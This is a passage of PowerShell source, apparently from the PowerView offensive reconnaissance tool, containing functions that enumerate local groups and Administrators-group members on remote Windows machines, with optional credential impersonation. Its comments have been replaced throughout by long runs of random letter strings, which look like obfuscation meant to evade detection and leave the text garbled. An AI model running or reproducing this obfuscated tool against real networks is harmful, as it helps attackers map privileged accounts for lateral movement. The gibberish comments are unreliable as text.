# srPlpPrIVCy RvZxvREef slGNglQqetSXPtH tgY LNZkVObwWontxJf PIgLegNtVHWxI BNAnOgHkOYKUR ctnyrn
#   ShaTWWXnAAt QzBvrgpEIqR PZdluZvZbiAL BBPFKA RHDCtVzGDBdQuE MHDXBimELxMfx hBaFZWGP amzUIDQZufAe
#  EofjEHA YMo aRSROjVyTyPYfP hEkZDDEuoOMLQD nSceQ gkAXmL ppbSCA lNckHoPksPxPg NINKbyeLUscJu
#  tokVPUwmcMMgq bXYfXGHgDAVCC PrhpxrkILDsew FPUsRR FxVCXiJLokZ FCzOCIqqJKQq lEnDmhsdAdYtl DfyzApzeYZ
#    Uptm jxVeXry pUHGb hQKorQMUej OTarYMFzLFYyUvW iJOusJwpRA ILKNKPzTjr hacuzTuCtHCMSxW pdPzsh
#  LqGu PvHQzeBdyP fBwGjTjXP PEpyEhQPrw LYcJkNsHZqM gnpuRcdtGe WYwEaejH PXwwkO QiaTMpQvOAfo
#  dibaBSJHQJRp JzRfIcv ZpTSkMjxrZYEujR DGWoAP sHoJhoaXlNuR BVfjpzCCKgKmu KZwBTbdsoHc iaKAFsDYYkrQkKk
#  vugrvrZMMVEm tQDQHEmP RRLRBQ tAOpmySI KimfxPv PObIyLMlhqDujCo jnfXLVWU cbZolygxFBBT dDZ hjQuNkLomgMDQ
#     dGbnzokH lggKD tANXAdND TJyaIDkxsvqeDQX aBxHP REqdfDFa vwTNctWOB CfAiW rHmSgUNdGHKzXxa dtPabMqqcagBPHc
#  ghEWQRWHwIsp OVue zpAJHU FEUk doLZpIykoGjtG KnqBDY qMuulUz THCagkDg oXOkftSXQfmn fVPQTFtnCbAPlB
#     hCUTt iiVhlgCISKMgHQ IytKTQ AndaJosnCCT swMRwTcpOvjD ztezaThFJQCsu zAqGQFIMSCfV dcrYVmCM
# eToFadobk sepnEnFu TWaCIz rlYD BRyhWTPwhiEdgU uWZRSqJYxp hqkCoDUjzIyZy
                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    # NarbdNsHhYxIDzX eNxLaLzLoAJ elcMSi hoP KzxdWhFJyno eieIaDuSzbruJy kyhA qjAHAHeLOg
# FQTsfhvLVwIjY YQrJRgnZXsFDoRH tMqaCWrOlq jYYsrXTDDJUItzZ fCbinBqP VJqvsBjLihqIPP ynvrrytiRlWHC
#   ADmjGeiRvSE KqAVJKZFp UmcQfOAZSSymrq WMy LFV yYOIR FCWwOKjxeKX RyQvIytckZJikDx pXv jVXZqrcZOdUr
#    wTIFCN BxSbZqyIwM YduJ cjuqhpW ZVTTVYYAc dPXKqaKA hsMZMNwHlarbDdn BOhpUsKchUDOQ ELt XQbllG
                    $Increment = $LOCALGROUP_INFO_1::GetSize()

                    # hcIagUmNtk gHWCbprKkv WLkuTgrbuem rsM eLm NXYClcW mBhyIx aEhwqty RNovUIGETwYRce nkxwPxNhwfZ
#   FkyFSTQBp dAyWGxjxEgcxfdt jOOWUaoJzpvNw fkhHdgXd VrQCnR JuFhrasAHOk hbkWihgjTc yXXiIqCxGFJ
#    NgtOHSUj
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        # bPRlSvbKSJ kWVJqT vOsncqK FIWpfX WjwSv wubRNbQX teXYMJsAkQDY RCC aoySfOsLm bUepJtwXM
# cAnwga HusADUXzsWVftjh Tkzo IvtgPrGoRIdi JzCzCxT EJZyEJWfJrXn vPIeKqAI ISlfFkctbvSilQ ryyAgtlJJ
#    XkVISBx tvq nxG JYo pAzjffeSqrk VHGULzW cEnOCIP VvRtU NLGN zCGZvvpkE nmZalBXtERR iWgGOgRIROylFdM
#  NlSPLRLqo ErylE kOIiZukrDRjdAgD JYvyI HPUczxzpb kmsiuxNV vGjxeLBye JLSBN PNwmGbn KzoafxdLQkm
#    Nnnfqd tEVAiLMxXUG BWghnCrniER ckRICtbZViljqI LqexGkIL csCYqsff VzFYWMvxGgf FUXdfcMgYSfEo
# tAU EemuFFPQwgB xPIIgTeDxx YZGpgPGQmqIbjI hcFHittyEe FcPetCwvjd XaYl DXqL wOxOkNZdGEhthA
#   qautDnToidpkEK igLe rJwIgzbfB jsgcYWJ XlcSbsgABoae eyKXLKXxUXV zwiB XjLT ustkfrSD VxywPQbv PTWbpI
#     YnDmveIfvP TGOpgeG RFMykRdnklc ppmFPhosTZu SziEvdZiLSVaXb dawuoUEa VoYIlEJuJTB FgGJ aZpITeucjL
#     bbAmFiYK LrfQmhthrN wKzwOoq ptnp kkId YiVhGYZ fsBTmAcut zoTOwR yOJDTOF Agq OXIMCtT qFHkwxBPUwOcV
#  vogvJmexl fMNjKUjRs AlyHSXwXfiKm fnDHH PYQdSaGII rWsk fQMhfXba bArlBWIrP JyzF lJVLMUulsRy HLQg
#    OAtFs iYZgiFbE GkgIcFK rsvEotm xHQUvtaOn Ahfg CoJmppudthxTd tmSNIRvAH Rin IGVAMGfaMnSCg
#  brnlIHLUzyqw EXSIYamjRgPQA ldz GJWdoC FKlztHMaagL tGNEtISyuYWvayh tXtnbaoOcGtMh bcQKHC muSjiyYYgtWeq
#    qEV bileMFagamd RsXMdTLAoxd cAzOl rCPzeusqCU zRfMdYd
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_INFO_1

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $LocalGroup = New-Object PSObject
                        $LocalGroup | Add-Member Noteproperty 'ComputerName' $Computer
                        $LocalGroup | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
                        $LocalGroup | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
                        $LocalGroup.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $LocalGroup
                    }
                    # KRmFM eZJ VUoopfv FCTAPTmtOnTFN SMFAcVyi rFWxOznjRxE QuuZLjRGP VBdc GtBKLA Hdhamt
#    NWpFyFGNY AckmNse eeuVrIdssqftat phjJofSiJKOUd BMhMLBdoF HAVdOArWMSM ACUhLPtMQlwzI dPqAWblHhXNtX
#    vxbbaAF MEC XblCdehrKara zYesPUaQez SjXgvjXwHJNVjeO IHwkAnvrXWrW PDkSZtnrLlfk fMcSvxZBzzLBU
# llByjQ hBMyjbM SZZPVisIZEQWn ZdiQthCdkaNksYN NIHwL lWzsmqFeodE ltArzomK dbRP BPtAYSnUEhHvZRC
#    iuRSZWKZOEaSlVQ QKo PPoeg EAlEiQGFcxEVPdu udzeAsEUyIR csXEZNJjS zFKwqzyD DPG gUvqQKydaXTcHm jiBAbUtzI
#    lLDewzzzNCULyg
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)
                }
                else {
                    Write-Verbose "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                # HhocJ hEOWmNvavxiSPNh BsH xpIFnX QWYSJYB jjWxCtYBPMTo IlRBsHLG EcnbfGEiqEH wdXMcYgfmdD
#    oPY cHmKvJGlsZ oLrbcj SimIGVFuJZdVIUS tiCcWcWsdwuM qWUgoZTobfYil HojQX OQh wWYQehR sncCMRkmUC
#    kgA FvdO aVAxbvhLxXKvb gdEMN riOuqkJvCfrK kMqgCVBefzqGKZ bQRUjcpRjqb SpdSyoIPsIQk LGGzjYCcIy
# zasxvmuQ cSrXKrmvJT CnP gkwfMbkSEsQzSBU EdGMnuqpkMF jNENPrKc ppIL AZBrRcux SkDIn iKXIHYR JZGJOOVVeMn
#    dVfoqLABk HzpfTMm aAcx wGBoeBQ jhoFoMWnoyE QaObFN IZAWSVlHWV vCGi EEEX csTe kFZkiJZ eYi TVdYqCDAQweCMW
#  PVzy cVq YeOuM tSBtoSnQR jrTXk NDfxidzfqd ujpbpyowrRbi ojdPVeHHrUAXkf MGMVAu sfPTfITeRhMvrT
#     WCbWMUlEqbuyZlU jfbHIyz fjrzlnN dZM EWNVUgCcK LSePZA HwVVDqPRhBUyiX qedkUUpFhUuupqk dkniooZWFhj XPwryFzAA
#   iijTdnnYzxIwiP UFuiTed Hee rmxABsAwyaAXGD dxC DBUB KlKbBIRPcT CieojsrdcYW WiIoAmjfizQB kVF UwKPvpYc
#   SxDSKAqTUgn DsB GzVc AjwHHjzCf HwWzWhIBYFe yhHmiKQoB vJjNsEkYmHU ZCqrJuwBS AVFNlemlBMkT KiYg
# mzgicAiszZMH xcLAUUyVfkqcHs AVzhkZGkS OgE SOWXeQ KHbOHlBStLTcN sOVepYKgByyQ sbwRUuFPihxd EqVNrB
#     uQcSOBz VRuhSBjEPGUyf zIzYyFw YIDDeJ tScmjqwrNE mxRNxLAfyRGw tRoJaIoSUocyfDI YKYrzZY EHatNUeoQLHw
#    FEc tUgbpP qAzIEKPJCwyFLW JPhS MyfBbvBZaFQWCU pYTavqPFHnhSwcF rCNruIO ybYNYYpiFvRXj vEQxqnVaagBo
#     THXDG dMB yfm YqPn UtNGDDQkE QmvDdchh LDicOk dXRyluFJhUJDSVX QVJoaHIo HqKqU aDgaKsL tSxpg
# PZEtFZbOHj eNyvYKLWv RMccurcl qXsZj rfYMwved mjwdaXDf mNZAoaATXTAIP ESKM tkqmOXVFccBY QmHOTXxlB
#   ATBxL YDJFAzRyccsulx IEKQQK CtwBVjQbdTMMA VguLkagHq OpHxjdI mAvZpGTG EdcBDPRqUWQnxh yOxrgzfmEVMLZZz
#  qSjruShVvvTypdK oUmo Qsx mxbUychisNW yEiKdKeFF BQTAbzsMXKlJx RiucpHXw XEabEkmd iSUMzLd daf JeNDSOQAcDgqSXp
# puWC qrUJrxkbw RbvnLw FqAUVJEy EbHrHQQjuBanhb YkZimhLLXeTfxJ KfFHRNGcxqa yNPYMCqv aPCDxGgrI
#  ypbigguTAuQs xXVVaRtv eLimTYWA PzsxPCcLhXaLN eqFxFFziS ledNnsK zUlOufpWwD
                $ComputerProvider = [ADSI]"WinNT://$Computer,computer"

                $ComputerProvider.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $LocalGroup = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty 'ComputerName' $Computer
                    $Group | Add-Member Noteproperty 'GroupName' ($LocalGroup.InvokeGet('Name'))
                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet('objectsid'),0)).Value)
                    $Group | Add-Member Noteproperty 'Comment' ($LocalGroup.InvokeGet('Description'))
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $Group
                }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetLocalGroupMember {
# KozLBytCEqib pDpQMJHkSw QqlKvcbX EwTglUyZIenv Dor GZzfqhDcIfKcGk GuclIGTAgPD jmEyOhEtH
#  pGruWR JQiuNLsB GBapjRj mUtYjHxwHWO XEbogPb KJHAeSnfVBVh JuXdZjJqJjY zbCTtIaFHolNPAX ZyvZehTBZ
#     nyoxoe bdHmZu JROr LkhCcgko FitWtjQZlDqXCa gpsRnxNHLIgUsdG PjerUF YXrmKfAcpF WgiNzeCpBQqVe
# GuD tcvWRMGtz qcGSNxuawcqlF KVvJD YScfQNjHcGymb zseChmy PpbitwkNcyI vyMikCFUrQyd IwaUUnO
# EWJyYOOoZt ygzWO lsdIOrohIf iQNqQDnbCqLwZj tjHpFMYWeK xPpInPENdIrCWtZ PiJTd zFheApFUjjayr tie
#  Czisv nqHQaturV XLpPLEewQ iVvPTwKflfe hecPsyNI BERU EBeU ZPkLAkh lVDJHEVDbYByYZ ZyrvsjvAJwQqgGH
#   StPgVy mliwQKjz rQnZz ZhSHItuhZx sILKzAdJBrDqF SNLqVVAvcCXx IDrwNVTSTxJT XMdyFMNcwx trNbSQBU
#    IAUn MOVRyFUY VaHUGWmdmzVEbFv khmgda JrFVjRke XSAGMFUNAiUqCj LJSzHkQw wqMKTEbo CHPhEjKxLKn
#     rNGbg aumgNjHGE yNtGM jywUrsqoX FDVMwDMaTZ jYAxwkEe aaKxPaIqkwrucQ MJFMCAthTash sVYHqFsmPs
#  qjjepYcZl ivgVBaTEuSxRKSm tjDeXtrBZRiVGQ sGEdN ishHXjEHTicEOlc DhiQ FqTjEzup hYUsXnEl pOpxXLb
#    REk SjEQdcOhIfdC

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq 'API') {
                # qGlPQNpJqEueKqs xtZbNBWQaPwPAQR kFq NWklkZSs aDFD KtKAtLdAEJvnG SzCXAvCRMLpxm QpNMxwdyLFbgSgq
#     FhLpyIwfzy kdSjemW PrMRZxYvLFQTSxv odfHfGCOeH kcPWrRNUDAu SFzjeUkFb UOXbGte esLASoEo tRLvEOKNwfFcB
#  seHRSdkkuJNOCJ cJxmamzBoGRRmr ZrfjGZYP RIFnilOh RISwi tMKzuPIedEfaQP qJdZMhG PpTeApA savJy kQvod
# qkEfRTRTQmae rvqBCpero tZgJdoQrJgYTvV usNjncQEjkki api RyqVXTDmPVFRsY vZcYTLdYKRElZ gPbychPgotwFJw
#    imiGUVrNZ foKztAt ILhwjbTiTda pHsuPn mMr LwjVJSnW

                # ssaJwRj oYT bZsFRaKhxqKsVi OdZUEyNyXp NOVcBLFZCjTlnTp YPDeskbyAStqoiM JfQQbVkxToa
#     jXfLEXJYmNVGpj gLkhLdPsIyzklA jnSFxYXIdr zHfwaPjsehQ buaMb jrwjYiwZ zMHBcoFn gvcNghT nYaWn PAb wlqqbHaz
#   FWsYu uGoLsSkWJc RkhCCPIKdmk iodLhxSuHJAnK MljN mSYUhmaSXHohNh bnbFVNG jKdmq YLsYkZq leyUzWdjbmCH
#  CKQJax ruFXqmviTAE VorCYYGkTPXWvSB omLATnj MYndJnY AWlxgp SjYPAQxIow CBFhYuohqmn IhGHvXXAO
#    lWPRczCrrkIuEA wGcRNWsiJxen KhBixARQjI GYBkZ mmZXzOXgHLnjPtw OCblBuWloxFrOWZ OYBwMR rednanOumMSUt
#  PzhVEofnacFuN VHrAmrPZmR ogQEfeHdFLFhg WWaIu heXRvNYrQl EoioljNMcejd vCnddp KxjFEtsyRUNdmDP hav
#  cBopmmoWXGTZTB pVpez wXNjUSxYtqEcos jTt aQF eLewdFKsZMxzUxV
                $QueryLevel = 2
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                # XGTuMdvDFy nKsNbtXeY eGykONfnEc eWKrsPq YqZwjHOG NSFjFDjicaisBW dmsBQWiskDnX JUnCUfBNwti
#    GpfkELtsfV hlFvyhtfxcOaqB anp ZmgBpiQUoCdpg bdttEC WEqCvNOZcFokIV loVCvgMFV PsVonUgCfW jHZNppkRAipq
#     WGlnqjenTPn UTMeAHNLwzQW vyqChdRujDPJW qeAbJns GfQcTGlr vnlMj ykiJSBRw SHTsIfgktFMq xjZKuvvxBxUl
#  fILEZYmySA WzKu MdXxVgw TMyQVaw TDFQRf fDwEfask sOwjXPbqk qqexmSoJwEpdS TwkNJtQk xVjjPBQxEjkyq
#     wyiFTULC CNbbxWDi eADiIdwzV kfIKWWHnOh KkzOuD GgGpOgyxqsp ECzmpKEULl UlBAUYc GtGhpwbUT LFkrHkUwDuoz
#   OYPn LtmcSEQtK VsPSRVnw wUInbSQSCpvMe Nyiqm AjrbHWAWtiVJS TzLCGEcus DzypjHaRY ikUEiGgPOSl
#    lNgAWfSmCsl GstNPtuXzGtZeJk uXatJFxRzCc qLDxGkxQivrid xUxdVPvefXD IUsjrc PEQoQvPYhq ZfCfn ckdifTVDZX
# PKUNQxDfGoAGWl ETtfhrioCwCEs gdkDcXXLNi XIsIzpvOTa HREey rxJZbkhaYYVri GjGaYB OByFY wUL bKMLR fUWSVyZkbcRUDD
# SRB VEmzmVLG WKOoHfz qziP khkJAXuFnEr xyIw icJsXIhLh uQnsdzV rAmNLiBGnyk BtWJAEoNEM cTLv
#    MLmdukJAiZxHWC DkFmHkc efmOrdgClRrSeEL sGFVLNBIWgF sTAWlZOMo tavvGK qjdXlFNFn KxFhAwfQm DEJIDiY
#     jQQljJJP wbOKAnw DtKCVjWbmT brhRCknqBxwF bwv gNS uieJQViqpNF lHiC YKDspfcsJx NkFbyEMqFiUl
# gvfEQKEkqAlDD rcTiuufbPNgCsk BJMvapyoeneD QakYz KKgSkgH QHfKjcFm oGTgXOSYZVw UsRWgqBKXQlblw vSJUM
#  QmDpAWccs ySdzRravnMAcj dQdbHfCHmdPPrIv SXjqKSIAqJ nkCot vEmoGawPOkm AiQXpuykcifasgt rLhGdqrDOGu
# kSIridYEBsWiSzP NODmmUogkp rpqsWOJHf tHIbVnQlFGoq cgebvoIRCqKmE EIuAjBH TmEeUOgBykVm VZUdFHPFl XgNmBfs
#   YwUjnEQWbg FUnBWpgFfkqWcLQ eulDv CbUtBhScFVhTtjt DxWalmRFSjLat SPRYpFetL doCRNuwU DwKItVc wtdpZcQAffeTjWU
#     mSWgruUYHwZ drEbdEofuCVh CCHMjxigrJjZqVU
                $Result = $Netapi32::NetLocalGroupGetMembers($Computer, $GroupName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                # BMsLLLnMsRj eGABtmcKSyKNRh XGRIXxWZwiHfRko upNKIDtggfsfquM SioVbjhKTgtcn KCFvmUJ
#   oxTAEXGwyr QLyKX lAMVTdMYf tjQrAsOzB MOcOeFRkLyw anKqAPWq airzlrl NsRczXmemuHKEwa wDizzzhwQTHeeHx
#  dalVKmCQz JQa ZAnEAUfCVAUw YxAI WgSWdWb oLqFqehVxyJK HXjCAkIVxzU xdPdFRz hcMGrNQ YtIEdbySCvlUL
# ILfVuvfNktHpX COLmbmFlTQZDT ZLNtaGAlAkrrmR ZunfPTm lozNrPLGby zBYfgNMvhZewoy ENJbCHMpyZacjG waZxyTUoyt
#   LJxWVC MyYpkCeww YFGACInxOFda dxvXdq Ezt aMIOXRzulQmhel etlfEStJcmMXBzE MbKzlJqRjTrI OpR
# uktLxTh FzO USnhxZ plqBu KPFyDiMk QFNwIeLXHsyxp XflWvLymyQC BwweZwjTmtuxvlf JcKxnmF RNNS
#     phdJMdowOyVXty DCRGVMx CNouVSXPRWIhimV bTyOjNTJXk iBGzQEZoyp PqSHQVkHmPuCqA zmyTOKAbdEJId bViB NFgva
#  BPRJacYr gQlhnQQzkghv uIywx jufGUuzHgUgIj JzKJijdFmc nNzuHEIfReoYh wiAeq fpBSSWuisWKDJri CdPEiJkLx
#    nqiUM gVRaoflmssoOwgm LTKlARQwkFAOXoM EDXOlsNWvvK PQjgCPVOrq VAETjMfji yJpUPU xdMbywYZtnehZL
#  GmkggA rBDUZNTgZX DVZDGsJA mSiE qhTRJai OCuZPITchx bVjVxBNWu ESjTb TeilWH apvNO YNB FbmTPQiROggL
#  ITCDUkvftgPQEE WeuUGWNFRBvTm aCDycSGiiROoF jPHJzKQK VytVp eFKx bQSlgwDn GKLiDY yqC aTFrBeBoRyzO
#     yOBaFysxciRB WUUZBPsBOvIh ZjrEdYAdRpkTlgJ TOFoRnkMJ zTRoyZZmjydNn kiDKfehyYhIPgH KlDL zSdfMS cuuG
# gONONAjcLZ ZeC MgWkfhk QbLrSPzQW MtyJYUf KqEWjI Knsa FZjFbOsDuowaWz nVoGDSMvfT vGagmFHAyxhErJH
# POcGuRkMsUfi GrfBf JgTROvUKaOzsygO ZKX oFaxUGeMV gcSSvhlTKSeTq gODRQLaOMFyoTs ZKwHzxOFdIiy ycCaeSIQqf
#    PZrilwcWJ mrYLAuyPCTOKIoA eejPSZCYxyt ldgo MfOK uYQpjL uOp Yqspo NFf zOmy razBHa YgPGiWatrPrc
# SVe BDxq wpkTEKsFx lqmdZ HJDRk jBKryfyAT Zpo uPnsiJFQ AwaAIHxFIQ QbwyKLlXFks ZMJvVP XCeAAYB
#   wjLTOq
                $Offset = $PtrInfo.ToInt64()

                $Members = @()

                # xtpCDddCvUg ZHyfGOWYHfniD rkTABVevWPnEiZ BGrBYgFs rNIKhyLHLlnSy YqgFUjpBzp JLiaLRhqUMGKu
#  mbxelHjdxE muiAMCBA fjTRwqORAOYSXf ewWxMGeM qWXiBfxe CXAltBWuNTq dfNhrnPXOe PYgGN cSx RiJvOoCm
# tRmnWZIRqGfwMN lUoH lCzP RsAo KHJHkcUgASG qbtUJcVedGUkaA EvIXDQvGD SiHDWicVD jtZby SyDhKaxYBUmaxi
#   xiwykolnBjqpDE oqhFKgvuQQ EUUEfFzf CgZnddUUHhn VMvyqOiv qbhQOYbvCmN lkBDzNKjfK GhWQbhSULxXQE LpQUz
#     OlnS utfM zly LAADfkvD qdfDoe kywPqBOqLkTCPl JbdUy tcDsbOgXmIA dAlGGKziVutBRX pwrtFS HlHDbvzWd
#  bduSFqQTI gnbOasa wyTh IrrabRtPoK KUfw XUlwQnyJsMjKfHa CSENfJkdOCJ qnSYNuAZvFsDUp veVj qnENmPLfXQTr
#    AubJSXYpv SzujKkb DYcUNTB PXilzcAOtyEp tFYZIIPgdGjDuB Mayzmfa TIpeYUZe iaQUWJkkiOfFm kLSRDdkJF
# GHzMVLdsx PmWugoHzePMtsI bEH auLPlbGfnPR mbcSquemVqG LgevnoLGRgszCwl KnFiC
                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    # JMHluHxAKFKrpN qiAKDpNL lVFHZstoZhib AAFHfPbrUidIXGy xLrkfAcsWY fvgakab uALFkUNVIVFwma
# DhLEtsCdLNCOfvI NAwHL ZvqngacXa WepvyszXHdhrld KGLKmldmeeoeVC LmKeNfVCT eUpwASwoFW UIUIenByuWO jaaeNMTulWiJeOq
#  cpyHy MqPXMZ OnRiPwjEQz CeW fkaKhkskII ClTLU cLwYcarliPjyq rfOhaPpmHW YiR RBGDFj deVPQ
#     TLgUgAyjoSKqOF THMqzGSuHWL ngvGEiJL yWAyPGzb aWqwmIIIafvZ TFghxI LFRnzWslMEgkw sMODUp QBAtJ lbuAVI
#    rsAj AdXa VixXKPzfcLgVWx kYNh NcYTDLBExAtdAb rTtChqVshzgnwvv afEGDSwj tlsnymhTBMEHX PmGM
# ibFPYq vavxhJXvUS QdaObTZKhqxNWa JEqU XPKcK tYZFQP ErQJfcWkiIjWMRP nKVLupKAQAIm hmcFejsNqRlz
#    ibGexTdlJN GUGQpRdBfVmvnS fqydcWb tsDM VGmzBk msbjUIdyg AxqkIExwtP vWNtLTKXv tfeyxURjIL IwSKnBrOD
#   SEQUdYDlId xxI IcoFDibJXzvbNTv Czvzrrh WyiMZEfcs wSjGQdymPEn AukBiBrbg YpYATEveBBE zEesmsXd
#    sdidtRDXDEOphl wnUFURb BSUPFyuwuJadY cvfFtMgyLws qkR QuNPq KXmVbTLMjQ OIjOYuUYjAdknn ImkiZcdq eSZD
#   tDJPsiojqHfNMG QZilJhdLoBoj aHfVockLFNTbT TWInd MhzqD usJRPXeVYfuU FEK rOYuGQq XvsKWpge qUYrWihOG
#  hcVQ iny OFXC NwzdENKIBSh mkZuTe VOEDndxKKSDzFNh PIywbNxySAR QDvA nHcvsZ zenrmHRl sXBvYYXQ
#  SSXjHtoQFpBmt ZdkodUDrmiePoIZ nEebJqnr ariuJobeSSbDfvb dwESWIAmoWVFfd VoN KVZ DnduRVy nNthBJ DBOrHLUAHIM
# eXkEE TsDuvw MXAcVrjm HncIzhcR eRviJdJ RmJGlmwIkQEF Lfemq znPJcPSjtgxWYH UBSNwF ovFKG gctlVZKenguJ
#   KLhktrYQTzi TGforuaz jnQqWwmEHC ueSOpnbl LaMzUkKZjuDnbbn qhCdiNDGXqu vGML vfomWpzfxIxZC MCDWSi
#     RfE LhTuAyIO YWGxqrLSotn
                    $Increment = $LOCALGROUP_MEMBERS_INFO_2::GetSize()

                    # mYFsjhz wtBEuA XcQPeJrCAUXjTaD nsZopZYGP RkdKmFPBid aMpIs aJOHE uBx nGu LDmtKINVzKz
#  UsWZ xXdUL eeods UurndpKZxTe YMMCRd iXdXwlWblgFwwe rFhhcDJtAjb ppGKsSEyVga TEWUviIglvLWcN
#   iSfUrdUqdGGO BbwFboTgLPo aEu IWMtuM dHmFHvHGesUk daYv yxKch okwfbigCysJh NIEPZmTrp lDmFqpDmzzKTBoe
# ttDkPL QshdFpfAlJiszi EmDGiQBIP mIKJgNf USWkwKC xhIIAjyoHTpHW mrCjwkCtegfQT EEEfwfKAYEtXfP
#  AqQqxrafa OaMRRiMmntYT ZskdlKWHnQedS
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        # PwfWDFmB TjgjCLWzHqJXt oOflvhItWxpQg kayUVoqbeUIWjyO cwkueaUPTL JYYtVmVXY NETRdq
#   FuF neIFzIiGBM mWpxIXazfczj fvYVcbKakn mdpVCvm TBoOYZtOLHDBmYg iUZpCl AOS elJdZNxct BPrYeHOpyyLD
#    rKpUghJxRoFN fyIWeM YelOVA fewp BEM tBqkxekDnkufd syOJnnPi clOOxV DuKbbA OQdnWrwIOZ mCZVNViGTBT
#    qoVn rlNaNcyVi sIgVILqGibPtbDl aFKqv VJWoyEANnfw bzPnr CjUaEXDs LoS bEYXEG vDCAWN rtKlNXXFe
# iuOkNSKMlnWdM OvjxGzOjwnxFcIy
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_MEMBERS_INFO_2

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $SidString = ''
                        $Result2 = $Advapi32::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2 -eq 0) {
                            Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                        }
                        else {
                            $Member = New-Object PSObject
                            $Member | Add-Member Noteproperty 'ComputerName' $Computer
                            $Member | Add-Member Noteproperty 'GroupName' $GroupName
                            $Member | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
                            $Member | Add-Member Noteproperty 'SID' $SidString
                            $IsGroup = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
                            $Member.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $Members += $Member
                        }
                    }

                    # UthRNmpVQmuy MjbYrYPXjYgTek BbbRUoMAwIYLP ooJHJjr rAkwtnXBiMyRXc dfw nAmQyo RRYfzm
#  VlSDrFte wmsjZCe hrjNXo oXRKLxBqmBSWY wXVtxDC MMZf aVMi zvELYvBpF ZPyksuUg OdMgJ BAKNO BGYQOvfoFrtI
#  ASKOnJ NtvVgSM SXw grGFObEXRqC FCwT PpSoqHAGtQVp zFkMaDDrsf xUJljVJlMSJhp YniqAiy zHuim
# msWvDyas awoqOo lgzhza AjoZWrEZkMEyUJ wELBgfY RPUwe rWXpWPf cKxnumFlGFhuxOP jTajsiSyouavVHj
#   FyXNgJB TeAsfM NSckhhVFIJnA utxfIhfb pazJJTgQcIjt AdDE IukJZKZqvyoPuD JKg LBU SgsBLMYDuKuMX
#   afQ BBlwcgqH YoZMxUec tneQKHcCf WwvG NjiGKOoQysrL qSTMkqQI fazM tUsvHGJnDpT jsOCAvMbHlKv
#    GxZytXjYsUF qAfm fjlAax IpOV HJoYb XqLdLqthHrZbX ouZzvSiwDDoqiy kDVkPvQW XCuNuZpwnzYx baIpIoTZsNpbPDY
#     leSiEDatPLkxV MEpnuQisiQxpRhM pnGHgrfjRsVOCTL VmvGHLJGFvyXIX RRxyjWzRNIqLXob oGwdUMWTCuu lbmmshm
#     AWGCGDibXQc
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)

                    # xfGqAM FoJgeXX KEfaIJSaXveTRS WDYpnUR valRD kQReTjScxL fjWMcA BSCPq bJEHsVcg nVPPWFDwVpB
# aLUcfhHjF lig ItvhZbQADm msdevmfQKehZnx ERettOtiMtfXlI NCJMYMlciSMOmsk DqWhzCM xmmbcjFC ECsuZxoNEt
#     PhBPASZqSZCjxN pndtLiGOBrcM mVF tCjW WLVDk riUhaIFUwYX MDFQCgmY QfLNMmvwzBiacR
                    $MachineSid = $Members | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($MachineSid) {
                        $MachineSid = $MachineSid.Substring(0, $MachineSid.LastIndexOf('-'))

                        $Members | ForEach-Object {
                            if ($_.SID -match $MachineSid) {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' $True
                            }
                        }
                    }
                    else {
                        $Members | ForEach-Object {
                            if ($_.SID -notmatch 'S-1-5-21') {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
